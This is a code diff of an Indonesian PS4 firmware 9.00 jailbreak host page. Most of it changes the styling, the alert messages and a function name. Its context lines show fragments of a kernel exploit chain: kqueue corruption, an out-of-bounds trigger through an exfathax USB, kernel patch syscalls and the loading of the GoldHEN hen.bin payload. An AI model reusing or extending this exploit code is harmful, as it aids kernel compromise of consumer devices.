@@ -1,6 +1,6 @@
 <html manifest="Cache.manifest"><head>
 <style>
-body{background-color:#ffffff;background-attachment:fixed;background-size:100%;background-repeat:no-repeat;font-family:system-ui;text-align:center}
+body{background-color:white;background-attachment:fixed;background-size:100%;background-repeat:no-repeat;font-family:system-ui;text-align:center}
 button:-moz-focus-inner, button:focus{outline:0;border:none}
 button{font-family:arial;font-size:20px;text-transform:uppercase;font-weight:700;border:2px solid #404040;border-radius:4px;padding:10px;cursor:pointer;display:inline-block;text-decoration:none;background:0 0;color:#d4d7d8;box-shadow:0 5px 0 #878787}
 button:hover{font-size:20px;background:#000064;border:2px solid #6089f6;box-shadow:0 5px 0 #ccc;color:#6089f6}
@@ -9,12 +9,12 @@ button:active{background:#ee596f;position:relative;color:#000;top:5px;box-shadow
 <meta charset="utf-8">
 <title>PS4MACEDO FW 9.00 SUPERLIGHT INDONESIA</title>
 <script> // load the cache
-window.applicationCache.ondownloading=function(){localStorage.isCached=!1},window.applicationCache.onprogress=function(e){document.getElementById("progress").innerHTML='Menginstal Offline Cache: <font color="#ee596f">'+Math.round(e.loaded/e.total*100)+"%</font>"},window.applicationCache.oncached=function(){document.getElementById("progress").innerHTML='Instalasi Cache Berhasil!',localStorage.isCached=!0,setTimeout(function(){document.getElementById("progress").innerHTML='Proses pengunduhan cache untuk menggunakan host offline</font>.',document.getElementById("progress").innerHTML='Keluar, nonaktifkan jaringan dan kembali ke browser.', cache=true},2e3)}
+window.applicationCache.ondownloading=function(){localStorage.isCached=!1},window.applicationCache.onprogress=function(e){document.getElementById("progress").innerHTML='Menginstal Offline Cache: <font color="#ee596f">'+Math.round(e.loaded/e.total*100)+"%</font>"},window.applicationCache.oncached=function(){document.getElementById("progress").innerHTML='Instalasi Cache Berhasil!',localStorage.isCached=!0,setTimeout(function(){document.getElementById("progress").innerHTML='Proses pengunduhan cache untuk menggunakan host offline.',document.getElementById("progress").innerHTML='Keluar, nonaktifkan jaringan dan kembali ke browser.', cache=true},2e3)}
 </script>
 <script>  // check if cache has been loaded
 function Hide(){
 if (localStorage.isCached){
-poc();
+setTimeout(poc(),150);
 }
 }
 </script>
@@ -52,14 +52,14 @@ chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_
 }
 
 function jbdone() {
-goldhen21();
+hen();
 }
 
 function allset() {
 window.progress.innerHTML= LoadedMSG
 }
 
-function goldhen21(){
+function hen(){
 progress.innerHTML="Memuat GoldHEN... <font color=\"#ee596f\">Harap tunggu!</font>";
 LoadedMSG="<font style='color:#6089f6; text-shadow: 5px 5px 5px #ff5757;'><b>S&nbsp;E&nbsp;L&nbsp;A&nbsp;M&nbsp;A&nbsp;T&nbsp;&nbsp;B&nbsp;E&nbsp;R&nbsp;M&nbsp;A&nbsp;I&nbsp;N&nbsp;!</b></font>";
 PLfile = "hen.bin";
@@ -77,7 +77,7 @@ setTimeout(loadBIN,1000);
 <hr width="65%" size="1" color="#ff5757">
 <br><br><br><br><br><br><br><br><br>
 <font style='color:#6089f6; font-size:19px;'>Host ini bekerja secara <font color="#ee596f">OFFLINE</font></font>
-<div style='text-align:center;position:fixed;left:10px;bottom:10px;width:100%;font-size:22px;color:#ee596f'>
+<div style='text-align:center;position:fixed;bottom:10px;width:100%;font-size:22px;color:#ee596f'>
 Terimakasih Kepada: <font color=#6089f6>TheFloW-SpecterDev-ChendoChap-Znullptr-Sleirsgoevy-SiSTRo-dan semua yang telah berkontribusi.</font>
 </div>
 <script> // int64
@@ -954,7 +954,7 @@ chain.fcall(window.syscalls[6], kqueues[i]);
 chain.run();
 
 //Trigger OOB
-alert("\n\nMemulai Jailbreak! Ikuti langkah-langkah di bawah ini:\n\n1. Masukkan USB exfathax. \n2. Tunggu pemberitahuan USB tidak didukung muncul dan MENGHILANG, lalu tekan OK.");
+alert("\n\nMemulai Jailbreak! Ikuti langkah-langkah di bawah ini:\n\n1. Masukkan USB exfathax. \n2. Tunggu pemberitahuan USB tidak didukung muncul dan MENGHILANG, lalu tekan OK. \nPENTING: Jangan Lupa Lepaskan USB Setelah Jailbreak Berhasil!");
 //Trigger corrupt knote
 {
 for (var i = 1; i < NUM_KQUEUES; i += 2) {
@@ -983,11 +983,12 @@ chain.fcall(window.syscalls[203], patch_buffer, 0x4000);
 chain.fcall(patch_buffer, p.read8(KERNEL_BASE_PTR));
 chain.fcall(window.syscalls[73], patch_buffer, 0x4000);
 chain.run();
+// alert("\n\n\nLepaskan USB sekarang. Lalu tekan OK");
 setTimeout(jbdone, 1000);
 }
 else
 {
-alert("Jailbreak GAGAL! Tutup browser dan ulangi SELURUH PROSES,\ntermasuk menghapus cookie dan data situs web.\n\nCatatan:\nHanya sambungkan USB saat diminta.\nPeriksa apakah USB tersambung dengan benar,\natau mungkin USB rusak, ganti dan tulis ulang file exfathax.");
+alert("Jailbreak GAGAL! Tutup browser dan ulangi SELURUH PROSES,\ntermasuk menghapus cookie dan website data.\n\nCatatan:\nHanya sambungkan USB saat diminta.\nPeriksa apakah USB tersambung dengan benar,\natau mungkin USB rusak, ganti dan tulis ulang file exfathax.");
 p.write8(0, 0);
 }
 }
